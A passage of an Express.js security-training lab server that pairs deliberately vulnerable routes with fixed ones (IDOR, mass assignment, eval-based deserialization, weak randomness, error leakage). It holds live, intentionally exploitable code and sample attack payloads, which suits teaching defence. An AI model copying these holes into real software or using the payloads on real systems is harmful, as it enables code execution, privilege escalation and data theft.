<span style="color:#6a9955;">//   - Form submission</span>
<span style="color:#6a9955;">//   - Popups (window.open)</span>
<span style="color:#6a9955;">//   - Top-level navigation (window.top.location)</span>
<span style="color:#6a9955;">//   - Plugins</span>
<span style="color:#6a9955;">//   - Same-origin access to parent</span>

<span style="color:#6a9955;">// Selective permissions:</span>
&lt;iframe sandbox="<span style="color:#89d185;">allow-scripts</span>"&gt;                   <span style="color:#6a9955;">// scripts only</span>
&lt;iframe sandbox="<span style="color:#89d185;">allow-scripts allow-forms</span>"&gt;       <span style="color:#6a9955;">// scripts + forms</span>
&lt;iframe sandbox="<span style="color:#89d185;">allow-scripts allow-same-origin</span>"&gt; <span style="color:#6a9955;">// ⚠️ dangerous combo!</span>

<span style="color:#6a9955;">// WARNING: allow-scripts + allow-same-origin together lets the iframe</span>
<span style="color:#6a9955;">// remove its own sandbox attribute — defeating the purpose entirely.</span></code></pre>

    <h3>Sandbox Permissions</h3>
    <table border="1" cellpadding="6" style="border-collapse:collapse;font-size:0.9em;">
      <tr><th>Permission</th><th>What it allows</th></tr>
      <tr><td><code>allow-scripts</code></td><td>JavaScript execution</td></tr>
      <tr><td><code>allow-forms</code></td><td>Form submission</td></tr>
      <tr><td><code>allow-popups</code></td><td>window.open, target="_blank"</td></tr>
      <tr><td><code>allow-top-navigation</code></td><td>Navigating the parent page</td></tr>
      <tr><td><code>allow-same-origin</code></td><td>Access parent's DOM, cookies, storage</td></tr>
      <tr><td><code>allow-modals</code></td><td>alert(), confirm(), prompt()</td></tr>
    </table>

    <details>
      <summary>When to use sandbox</summary>
      <p>Use <code>sandbox</code> when embedding untrusted content: user-generated HTML,
      third-party widgets, ad iframes, HTML email preview, code playground output.</p>
      <p>Start with <code>sandbox=""</code> (block everything) and add only the
      permissions you need.</p>
    </details>
  `);
});

// --- 18b: Unsandboxed iframe ---
app.get("/sandbox-iframe-none", (req, res) => {
  res.type("html").send(`
    <h1>Lab 18b: Unsandboxed Iframe (Unrestricted)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>No <code>sandbox</code> attribute — the iframe has full permissions.</p>

    <h3>Unsandboxed iframe:</h3>
    <iframe src="/iframe-content"
            style="border:2px solid #c00;width:100%;height:200px;"></iframe>
    <p style="color:#c00;"><strong>Warning:</strong> This iframe can run scripts, submit forms,
    and navigate the parent page.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// No sandbox — iframe has full permissions</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&lt;iframe src="/content"&gt;&lt;/iframe&gt;</span>  <span style="color:#f44747;">// no sandbox attribute</span>

<span style="color:#6a9955;">// The embedded content can:</span>
<span style="color:#6a9955;">//   ✓ Execute JavaScript</span>
<span style="color:#6a9955;">//   ✓ Submit forms</span>
<span style="color:#6a9955;">//   ✓ Open popups</span>
<span style="color:#6a9955;">//   ✓ Navigate the parent page</span>
<span style="color:#6a9955;">//   ✓ Access parent's cookies/storage (if same-origin)</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#89d185;">&lt;iframe src="/content" sandbox=""&gt;  // restricted — Lab 18a</span>
<span style="color:#f48771;text-decoration:line-through;">&lt;iframe src="/content"&gt;              // unrestricted — Lab 18b</span></code></pre>

    <details>
      <summary>Key takeaway</summary>
      <p>Without <code>sandbox</code>, an iframe from the same origin has full access to
      the parent page. If the iframe content is compromised (or user-generated),
      the attacker gets full control.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 19 — Security Headers Audit
   ======================================================================== */

app.get("/headers-audit", (req, res) => {
  res.type("html").send(`
    <h1>Lab 19: Security Headers Audit</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This page fetches its own headers and grades them.</p>

    <h3>Toggle headers:</h3>
    <div style="margin:1rem 0;">
      <label><input type="checkbox" id="chk-csp" checked> Content-Security-Policy</label><br>
      <label><input type="checkbox" id="chk-xcto" checked> X-Content-Type-Options</label><br>
      <label><input type="checkbox" id="chk-xfo" checked> X-Frame-Options</label><br>
      <label><input type="checkbox" id="chk-rp" checked> Referrer-Policy</label><br>
      <label><input type="checkbox" id="chk-pp" checked> Permissions-Policy</label><br>
      <label><input type="checkbox" id="chk-hsts"> Strict-Transport-Security (HTTPS only)</label><br>
      <button onclick="runAudit()" style="margin-top:0.5rem;padding:0.5rem 1rem;">Run Audit</button>
    </div>

    <h3>Results:</h3>
    <div id="results" style="font-family:monospace;"></div>

    <script>
      function runAudit() {
        var params = new URLSearchParams();
        if (document.getElementById("chk-csp").checked) params.set("csp", "1");
        if (document.getElementById("chk-xcto").checked) params.set("xcto", "1");
        if (document.getElementById("chk-xfo").checked) params.set("xfo", "1");
        if (document.getElementById("chk-rp").checked) params.set("rp", "1");
        if (document.getElementById("chk-pp").checked) params.set("pp", "1");
        if (document.getElementById("chk-hsts").checked) params.set("hsts", "1");

        fetch("/headers-audit-check?" + params.toString())
          .then(function(r) {
            var headers = {};
            var checks = [
              { name: "Content-Security-Policy", key: "content-security-policy" },
              { name: "X-Content-Type-Options", key: "x-content-type-options", expect: "nosniff" },
              { name: "X-Frame-Options", key: "x-frame-options" },
              { name: "Referrer-Policy", key: "referrer-policy" },
              { name: "Permissions-Policy", key: "permissions-policy" },
              { name: "Strict-Transport-Security", key: "strict-transport-security" }
            ];

            var html = '<table border="1" cellpadding="8" style="border-collapse:collapse;width:100%;">';
            html += '<tr><th>Header</th><th>Status</th><th>Value</th></tr>';
            var score = 0;
            var total = checks.length;

            checks.forEach(function(c) {
              var val = r.headers.get(c.key);
              var present = !!val;
              if (present) score++;
              var color = present ? "#070" : "#c00";
              var icon = present ? "PASS" : "FAIL";
              html += '<tr><td>' + c.name + '</td>';
              html += '<td style="color:' + color + ';font-weight:bold;">' + icon + '</td>';
              html += '<td><code>' + (val || "(missing)") + '</code></td></tr>';
            });

            html += '</table>';
            html += '<h3 style="margin-top:1rem;">Score: ' + score + '/' + total + '</h3>';

            if (score === total) {
              html += '<p style="color:#070;font-weight:bold;">All security headers present!</p>';
            } else if (score >= 4) {
              html += '<p style="color:#d4a800;font-weight:bold;">Good, but some headers missing.</p>';
            } else {
              html += '<p style="color:#c00;font-weight:bold;">Many security headers missing — high risk.</p>';
            }

            document.getElementById("results").innerHTML = html;
          });
      }

      // Run audit on page load
      runAudit();
    </script>
    <hr>

    <h3>Security Headers Reference</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Content-Security-Policy — controls which resources can load</span>
<span style="color:#89d185;">Content-Security-Policy: default-src 'self'; script-src 'nonce-...'</span>

<span style="color:#6a9955;">// X-Content-Type-Options — prevents MIME type sniffing</span>
<span style="color:#89d185;">X-Content-Type-Options: nosniff</span>

<span style="color:#6a9955;">// X-Frame-Options — controls iframe embedding</span>
<span style="color:#89d185;">X-Frame-Options: DENY</span>                <span style="color:#6a9955;">// or SAMEORIGIN</span>

<span style="color:#6a9955;">// Referrer-Policy — controls Referer header leakage</span>
<span style="color:#89d185;">Referrer-Policy: strict-origin-when-cross-origin</span>

<span style="color:#6a9955;">// Permissions-Policy — disables browser features</span>
<span style="color:#89d185;">Permissions-Policy: geolocation=(), camera=(), microphone=()</span>

<span style="color:#6a9955;">// Strict-Transport-Security — forces HTTPS</span>
<span style="color:#89d185;">Strict-Transport-Security: max-age=63072000; includeSubDomains</span>
<span style="color:#6a9955;">// ⚠️ Only meaningful over HTTPS — ignored on HTTP</span></code></pre>

    <details>
      <summary>Key takeaway</summary>
      <p>Security headers are a <strong>defense-in-depth</strong> layer. No single header
      prevents all attacks, but together they significantly reduce your attack surface.</p>
      <p>Use tools like <a href="https://securityheaders.com" target="_blank">securityheaders.com</a>
      or <a href="https://observatory.mozilla.org" target="_blank">Mozilla Observatory</a>
      to audit production sites.</p>
    </details>
  `);
});

// Configurable headers endpoint for the audit
app.get("/headers-audit-check", (req, res) => {
  if (req.query.csp) {
    res.set("Content-Security-Policy", "default-src 'self'; script-src 'self'");
  }
  if (req.query.xcto) {
    res.set("X-Content-Type-Options", "nosniff");
  }
  if (req.query.xfo) {
    res.set("X-Frame-Options", "DENY");
  }
  if (req.query.rp) {
    res.set("Referrer-Policy", "strict-origin-when-cross-origin");
  }
  if (req.query.pp) {
    res.set("Permissions-Policy", "geolocation=(), camera=(), microphone=()");
  }
  if (req.query.hsts) {
    res.set("Strict-Transport-Security", "max-age=63072000; includeSubDomains");
  }
  res.json({ status: "ok" });
});

/* ========================================================================
   CSP Violation Report Endpoint (bonus)
   ======================================================================== */
app.post("/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  console.log("CSP Violation:", JSON.stringify(req.body, null, 2));
  res.status(204).end();
});

/* ========================================================================
   LAB 24 — IDOR (CWE-639)
   ======================================================================== */
const idorUsers = [
  { id: 1, username: "alice", email: "alice@co.com", salary: "$85,000", ssn: "123-45-6789" },
  { id: 2, username: "bob", email: "bob@co.com", salary: "$92,000", ssn: "987-65-4321" },
  { id: 3, username: "admin", email: "admin@co.com", salary: "$150,000", ssn: "555-12-3456" },
];

app.get("/idor", (req, res) => {
  const userId = parseInt(req.query.user_id) || 1;
  const user = idorUsers.find(u => u.id === userId);
  const userDisplay = user
    ? `<table border="1" cellpadding="8" style="border-collapse:collapse;">
        <tr><th>Field</th><th>Value</th></tr>
        <tr><td>ID</td><td>${user.id}</td></tr>
        <tr><td>Username</td><td>${escapeHtml(user.username)}</td></tr>
        <tr><td>Email</td><td>${escapeHtml(user.email)}</td></tr>
        <tr><td>Salary</td><td>${escapeHtml(user.salary)}</td></tr>
        <tr><td>SSN</td><td>${escapeHtml(user.ssn)}</td></tr>
       </table>`
    : `<p style="color:red;">User not found.</p>`;

  res.type("html").send(`
    <h1>Lab 24a: IDOR — Direct Object Reference (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>You are logged in as <strong>alice</strong> (user_id=1).</p>
    <form method="get">
      <label>User ID: <input name="user_id" value="${userId}" size="4"></label>
      <button type="submit">View Profile</button>
    </form>
    <p style="color:#c00;">&#9888; Try changing user_id to 2 or 3 in the URL!</p>
    <h3>Profile for user_id=${userId}</h3>
    ${userDisplay}
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Server reads user_id directly from query parameter</span>
<span style="color:#9cdcfe;">const</span> userId = <span style="color:#dcdcaa;">parseInt</span>(req.query.<span style="color:#9cdcfe;">user_id</span>) || 1;
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const user = idorUsers.find(u =&gt; u.id === userId);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// No authorization check — any user can view any profile</span>
<span style="color:#6a9955;">// by simply changing the user_id parameter</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Alice is logged in and views her profile at <code>?user_id=1</code></li>
      <li>She changes the URL to <code>?user_id=3</code></li>
      <li>Server returns admin's SSN and salary — no authorization check</li>
    </ol>

    <details>
      <summary>Why is this vulnerable?</summary>
      <p>The server trusts the client-provided <code>user_id</code> parameter without verifying
      that the authenticated user has permission to access that record. This is an
      <strong>Insecure Direct Object Reference (IDOR)</strong> — the user controls which
      object they access by changing a predictable identifier.</p>
    </details>
  `);
});

app.get("/idor-fixed", (req, res) => {
  // Fixed: always use the session user, ignore user_id param
  const sessionUser = idorUsers[0]; // alice is logged in
  const attemptedId = req.query.user_id;
  const warning = attemptedId && parseInt(attemptedId) !== sessionUser.id
    ? `<p style="color:orange;">&#9888; You tried to access user_id=${escapeHtml(attemptedId)}, but you can only view your own profile.</p>`
    : "";

  res.type("html").send(`
    <h1>Lab 24b: IDOR — Session-Based Access (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>You are logged in as <strong>alice</strong> (user_id=1).</p>
    ${warning}
    <h3>Your Profile</h3>
    <table border="1" cellpadding="8" style="border-collapse:collapse;">
      <tr><th>Field</th><th>Value</th></tr>
      <tr><td>ID</td><td>${sessionUser.id}</td></tr>
      <tr><td>Username</td><td>${escapeHtml(sessionUser.username)}</td></tr>
      <tr><td>Email</td><td>${escapeHtml(sessionUser.email)}</td></tr>
      <tr><td>Salary</td><td>${escapeHtml(sessionUser.salary)}</td></tr>
      <tr><td>SSN</td><td>${escapeHtml(sessionUser.ssn)}</td></tr>
    </table>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: always read user from session, ignore query param</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const sessionUser = req.session.user;</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>

<span style="color:#6a9955;">// The user_id parameter is completely ignored.</span>
<span style="color:#6a9955;">// Users can only access their own data.</span>
<span style="color:#9cdcfe;">const</span> user = db.<span style="color:#dcdcaa;">getUserById</span>(sessionUser.id);</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Instead of trusting the <code>user_id</code> from the URL, the server reads the
      authenticated user's identity from the <strong>session</strong>. The client cannot
      influence which record is returned — they always get their own data.</p>
      <p><strong>Best practices:</strong></p>
      <ul>
        <li>Use session/JWT for identity — never trust client-supplied IDs for authorization</li>
        <li>Use UUIDs instead of sequential integers (harder to enumerate)</li>
        <li>Implement row-level access control checks</li>
      </ul>
    </details>
  `);
});

/* ========================================================================
   LAB 25 — Mass Assignment (CWE-915)
   ======================================================================== */
app.use("/mass-assign", express.urlencoded({ extended: true }));
app.use("/mass-assign-fixed", express.urlencoded({ extended: true }));

app.get("/mass-assign", (req, res) => {
  const user = { username: "alice", email: "alice@example.com", role: "user", verified: false };
  res.type("html").send(`
    <h1>Lab 25a: Mass Assignment (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <h3>Current User</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(user, null, 2))}</pre>
    <h3>Update Profile</h3>
    <form method="post">
      <label>Email: <input name="email" value="alice@new.com"></label><br><br>
      <button type="submit">Update</button>
    </form>
    <p style="color:#c00;">&#9888; Try adding <code>&amp;role=admin&amp;verified=true</code> to the POST body!</p>
    <p>Or use curl:<br><code>curl -X POST http://localhost:3000/mass-assign -d "email=alice@new.com&amp;role=admin&amp;verified=true"</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: blindly merges ALL request body fields into user object</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">Object.assign(user, req.body);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// If req.body contains { role: "admin", verified: true },</span>
<span style="color:#6a9955;">// those fields get written to the user object!</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Form only has an <code>email</code> field</li>
      <li>Attacker adds <code>role=admin&amp;verified=true</code> to the POST body</li>
      <li><code>Object.assign()</code> blindly copies ALL fields into the user object</li>
      <li>Attacker escalates to admin role</li>
    </ol>
  `);
});

app.post("/mass-assign", (req, res) => {
  const user = { username: "alice", email: "alice@example.com", role: "user", verified: false };
  Object.assign(user, req.body);
  const isEscalated = user.role !== "user" || user.verified === "true" || user.verified === true;
  res.type("html").send(`
    <h1>Lab 25a: Mass Assignment — Result</h1>
    <p><a href="/">Back to labs</a> | <a href="/mass-assign">Try again</a></p>
    ${isEscalated ? '<p style="color:red;font-size:1.2em;font-weight:bold;">&#9888; PRIVILEGE ESCALATION! Extra fields were accepted.</p>' : '<p style="color:green;">Only email was changed — no escalation.</p>'}
    <h3>User After Update</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(user, null, 2))}</pre>
    <p>Fields received: <code>${escapeHtml(JSON.stringify(req.body))}</code></p>
  `);
});

app.get("/mass-assign-fixed", (req, res) => {
  const user = { username: "alice", email: "alice@example.com", role: "user", verified: false };
  res.type("html").send(`
    <h1>Lab 25b: Mass Assignment — Allowlist (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <h3>Current User</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(user, null, 2))}</pre>
    <h3>Update Profile</h3>
    <form method="post">
      <label>Email: <input name="email" value="alice@new.com"></label><br><br>
      <button type="submit">Update</button>
    </form>
    <p>Try adding <code>&amp;role=admin&amp;verified=true</code> — they will be ignored.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: only accept explicitly allowed fields</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const { email } = req.body;</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
<span style="color:#9cdcfe;">user</span>.email = email;

<span style="color:#6a9955;">// role, verified, and any other fields are simply ignored.</span>
<span style="color:#6a9955;">// Only explicitly destructured fields can be updated.</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>Instead of blindly copying all request fields, we explicitly <strong>allowlist</strong>
      which fields can be updated. Any extra fields (like <code>role</code> or <code>verified</code>)
      are simply ignored.</p>
      <p><strong>Alternatives:</strong></p>
      <ul>
        <li>Allowlist fields: <code>pick(req.body, ['email', 'name'])</code></li>
        <li>DTOs/schemas that validate and strip unknown fields</li>
        <li>ORM-level <code>fillable</code> / <code>guarded</code> attributes (Laravel, Rails)</li>
      </ul>
    </details>
  `);
});

app.post("/mass-assign-fixed", (req, res) => {
  const user = { username: "alice", email: "alice@example.com", role: "user", verified: false };
  const { email } = req.body;
  if (email) user.email = email;
  res.type("html").send(`
    <h1>Lab 25b: Mass Assignment — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/mass-assign-fixed">Try again</a></p>
    <p style="color:green;">&#10004; Only the email field was accepted. Extra fields ignored.</p>
    <h3>User After Update</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(user, null, 2))}</pre>
    <p>Fields received: <code>${escapeHtml(JSON.stringify(req.body))}</code></p>
    <p>Fields applied: <code>email</code> only</p>
  `);
});

/* ========================================================================
   LAB 33 — Insecure Deserialization (CWE-502)
   ======================================================================== */
app.use("/deserialize", express.urlencoded({ extended: true }));
app.use("/deserialize-fixed", express.urlencoded({ extended: true }));

app.get("/deserialize", (req, res) => {
  res.type("html").send(`
    <h1>Lab 33a: Insecure Deserialization (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter a JSON-like object to "deserialize":</p>
    <form method="post">
      <textarea name="data" rows="4" cols="60">${escapeHtml('{"username":"alice","role":"user"}')}</textarea><br><br>
      <button type="submit">Deserialize</button>
    </form>
    <p style="color:#c00;">&#9888; Try this payload:<br>
    <code>(function(){ return {env: process.env.HOME, platform: process.platform} })()</code></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: eval() executes arbitrary code</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const obj = eval("(" + userInput + ")");</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// eval() doesn't just parse JSON — it executes any JavaScript.</span>
<span style="color:#6a9955;">// An attacker can run arbitrary code on the server.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Application expects JSON data from user</li>
      <li>Uses <code>eval()</code> to "parse" the input</li>
      <li>Attacker sends a self-executing function instead of JSON</li>
      <li>Server executes attacker's code — leaks env vars, reads files, etc.</li>
    </ol>
  `);
});

app.post("/deserialize", (req, res) => {
  const input = req.body.data || "";
  let result, error;
  try {
    result = eval("(" + input + ")");
  } catch (e) {
    error = e.message;
  }
  res.type("html").send(`
    <h1>Lab 33a: Insecure Deserialization — Result</h1>
    <p><a href="/">Back to labs</a> | <a href="/deserialize">Try again</a></p>
    <h3>Input</h3>
    <pre ${PRE}>${escapeHtml(input)}</pre>
    <h3>Result</h3>
    ${error
      ? `<pre style="color:red;">${escapeHtml(error)}</pre>`
      : `<pre ${PRE}>${escapeHtml(typeof result === "object" ? JSON.stringify(result, null, 2) : String(result))}</pre>`}
    ${!error && typeof result === "object" && result && result.env ? '<p style="color:red;font-weight:bold;">&#9888; Code execution! Server environment data leaked.</p>' : ""}
  `);
});

app.get("/deserialize-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 33b: Insecure Deserialization — JSON.parse (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter JSON to parse safely:</p>
    <form method="post">
      <textarea name="data" rows="4" cols="60">${escapeHtml('{"username":"alice","role":"user"}')}</textarea><br><br>
      <button type="submit">Parse JSON</button>
    </form>
    <p>Try the eval payload — it will be rejected as invalid JSON.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: JSON.parse() only parses valid JSON — no code execution</span>
<span style="color:#c586c0;">try</span> {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const obj = JSON.parse(userInput);</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
} <span style="color:#c586c0;">catch</span> (e) {
  <span style="color:#6a9955;">// Invalid JSON — reject the input</span>
}</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p><code>JSON.parse()</code> is a <strong>pure data parser</strong> — it only understands
      JSON syntax (objects, arrays, strings, numbers, booleans, null). It cannot execute
      functions, access variables, or perform any computation.</p>
      <p><strong>Never use <code>eval()</code> to parse data.</strong> In other languages,
      use safe deserialization libraries (e.g., avoid Python's <code>pickle</code> with
      untrusted data, avoid Java's <code>ObjectInputStream</code>).</p>
    </details>
  `);
});

app.post("/deserialize-fixed", (req, res) => {
  const input = req.body.data || "";
  let result, error;
  try {
    result = JSON.parse(input);
  } catch (e) {
    error = e.message;
  }
  res.type("html").send(`
    <h1>Lab 33b: Insecure Deserialization — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/deserialize-fixed">Try again</a></p>
    <h3>Input</h3>
    <pre ${PRE}>${escapeHtml(input)}</pre>
    <h3>Result</h3>
    ${error
      ? `<p style="color:orange;">&#9888; Rejected: <code>${escapeHtml(error)}</code></p><p style="color:green;">JSON.parse() correctly refused non-JSON input.</p>`
      : `<pre ${PRE}>${escapeHtml(JSON.stringify(result, null, 2))}</pre><p style="color:green;">&#10004; Valid JSON parsed safely.</p>`}
  `);
});

/* ========================================================================
   LAB 35 — Insecure Randomness (CWE-330)
   ======================================================================== */
app.get("/weak-random", (req, res) => {
  const weakTokens = Array.from({ length: 10 }, () =>
    Math.random().toString(36).substring(2, 10)
  );
  const strongTokens = Array.from({ length: 10 }, () =>
    crypto.randomBytes(8).toString("hex")
  );
  const uuid = crypto.randomUUID();

  res.type("html").send(`
    <h1>Lab 35: Insecure Randomness (CWE-330)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Comparison of weak vs. cryptographically secure random values.</p>

    <div style="display:flex;gap:2rem;flex-wrap:wrap;">
      <div style="flex:1;min-width:300px;">
        <h3 style="color:#c00;">&#10060; Math.random() Tokens</h3>
        <pre ${PRE}>${weakTokens.map(t => escapeHtml(t)).join("\n")}</pre>
        <p style="color:#c00;">Predictable PRNG — seeded from system time.<br>
        An attacker who knows the seed can reproduce all outputs.</p>
      </div>
      <div style="flex:1;min-width:300px;">
        <h3 style="color:#070;">&#10004; crypto.randomBytes() Tokens</h3>
        <pre ${PRE}>${strongTokens.map(t => escapeHtml(t)).join("\n")}</pre>
        <p style="color:green;">CSPRNG — uses OS entropy source.<br>
        Unpredictable, suitable for security-sensitive use.</p>
      </div>
    </div>

    <h3>crypto.randomUUID()</h3>
    <pre ${PRE}>${escapeHtml(uuid)}</pre>
    <p>Built-in UUID v4 generator — cryptographically random.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// &#10060; WEAK — predictable PRNG</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">const token = Math.random().toString(36).substring(2);</span>

<span style="color:#6a9955;">// &#10004; STRONG — cryptographically secure</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const token = crypto.randomBytes(32).toString("hex");</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const uuid = crypto.randomUUID();</span></code></pre>

    <details>
      <summary>Why does this matter?</summary>
      <p><code>Math.random()</code> uses a PRNG (Pseudo-Random Number Generator) that is
      <strong>seeded from a predictable source</strong> (system time). An attacker who can
      observe a few outputs may be able to recover the seed and predict all future values.</p>
      <p><strong>Use cases requiring CSPRNG:</strong></p>
      <ul>
        <li>Session tokens and API keys</li>
        <li>CSRF tokens</li>
        <li>Password reset tokens</li>
        <li>Encryption keys and IVs</li>
        <li>Any value an attacker must not be able to guess</li>
      </ul>
    </details>
  `);
});

/* ========================================================================
   LAB 36 — Sensitive Data in Errors (CWE-200)
   ======================================================================== */
app.use("/error-leak", express.urlencoded({ extended: true }));
app.use("/error-leak-fixed", express.urlencoded({ extended: true }));

app.get("/error-leak", (req, res) => {
  res.type("html").send(`
    <h1>Lab 36a: Sensitive Data in Errors (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter a number to look up:</p>
    <form method="post">
      <label>User ID: <input name="id" value="abc" size="10"></label>
      <button type="submit">Look Up</button>
    </form>
    <p style="color:#c00;">&#9888; Enter non-numeric input like <code>abc</code> to trigger the error.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable: full error details sent to client</span>
<span style="color:#c586c0;">try</span> {
  <span style="color:#9cdcfe;">const</span> id = <span style="color:#dcdcaa;">strictParseInt</span>(req.body.id);
  <span style="color:#9cdcfe;">const</span> user = db.<span style="color:#dcdcaa;">query</span>(<span style="color:#ce9178;">&#96;SELECT * FROM users WHERE id = &#36;{id}&#96;</span>);
} <span style="color:#c586c0;">catch</span> (err) {
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">res.status(500).send(err.stack);</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
  <span style="color:#6a9955;">// Exposes: file paths, DB connection strings, internal state</span>
}</code></pre>
  `);
});

app.post("/error-leak", (req, res) => {
  const input = req.body.id || "";
  try {
    const id = Number(input);
    if (isNaN(id)) {
      const err = new Error(`Invalid user ID: "${input}" is not a valid integer`);
      err.stack = `Error: Invalid user ID: "${input}" is not a valid integer
    at strictParseInt (/app/src/controllers/userController.js:42:11)
    at UserService.findById (/app/src/services/userService.js:18:25)
    at Router.handle (/app/node_modules/express/lib/router/index.js:284:7)

Database config: postgresql://app_user:s3cret_p@ssw0rd@10.0.1.42:5432/production
Environment: NODE_ENV=production
Internal IP: 10.0.1.15
App version: 3.2.1-build.4892`;
      throw err;
    }
    res.type("html").send(`<h1>User #${escapeHtml(String(id))}</h1><p>Found. <a href="/error-leak">Back</a></p>`);
  } catch (err) {
    res.type("html").status(500).send(`
      <h1>Lab 36a: Error Response (Vulnerable)</h1>
      <p><a href="/">Back to labs</a> | <a href="/error-leak">Try again</a></p>
      <p style="color:red;font-weight:bold;">&#9888; The full error was sent to the client:</p>
      <pre style="background:#2d1111;color:#f0a0a0;padding:1rem;border-radius:6px;overflow-x:auto;">${escapeHtml(err.stack)}</pre>
      <p style="color:red;">Leaked: internal file paths, database credentials, internal IPs, app version.</p>
    `);
  }
});

app.get("/error-leak-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 36b: Sensitive Data in Errors — Generic Errors (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Enter a number to look up:</p>
    <form method="post">
      <label>User ID: <input name="id" value="abc" size="10"></label>
      <button type="submit">Look Up</button>
    </form>
    <p>Enter <code>abc</code> to see the safe error response.</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: generic error to client, details logged server-side</span>
<span style="color:#c586c0;">try</span> {
  <span style="color:#9cdcfe;">const</span> id = <span style="color:#dcdcaa;">strictParseInt</span>(req.body.id);
} <span style="color:#c586c0;">catch</span> (err) {
  <span style="color:#9cdcfe;">const</span> ref = <span style="color:#ce9178;">"ERR-"</span> + crypto.<span style="color:#dcdcaa;">randomUUID</span>();
  <span style="color:#dcdcaa;">console</span>.<span style="color:#dcdcaa;">error</span>(ref, err);  <span style="color:#6a9955;">// Log full details server-side</span>
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.status(500).json({ error: "An error occurred", reference: ref });</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
}</code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>The client receives a <strong>generic error message</strong> with a reference ID.
      The full error details (stack trace, DB credentials, internal paths) are logged
      <strong>server-side only</strong> where support staff can look them up.</p>
      <p><strong>Best practices:</strong></p>
      <ul>
        <li>Never expose stack traces in production</li>
        <li>Use error reference IDs for support correlation</li>
        <li>Set <code>NODE_ENV=production</code> to disable verbose errors</li>
        <li>Use centralized error handling middleware</li>
      </ul>
    </details>
  `);
});

app.post("/error-leak-fixed", (req, res) => {
  const input = req.body.id || "";
  const id = Number(input);
  if (isNaN(id)) {
    const ref = "ERR-" + crypto.randomUUID();
    console.error(`[${ref}] Invalid user ID input: "${input}" — stack trace logged server-side`);
    res.type("html").status(500).send(`
      <h1>Lab 36b: Error Response (Fixed)</h1>
      <p><a href="/">Back to labs</a> | <a href="/error-leak-fixed">Try again</a></p>
      <p style="color:green;">&#10004; Generic error returned to client:</p>
      <pre ${PRE}>{ "error": "An error occurred. Please try again.", "reference": "${escapeHtml(ref)}" }</pre>
      <p style="color:green;">Full error details were logged server-side only. Check the terminal output.</p>
    `);
    return;
  }
  res.type("html").send(`<h1>User #${escapeHtml(String(id))}</h1><p>Found. <a href="/error-leak-fixed">Back</a></p>`);
});

/* ========================================================================
   LAB 23 — CSRF (CWE-352)
   ======================================================================== */
const csrfUsers = { alice: { email: "alice@example.com" } };
const csrfTokens = new Map();

app.use("/csrf", express.urlencoded({ extended: true }));
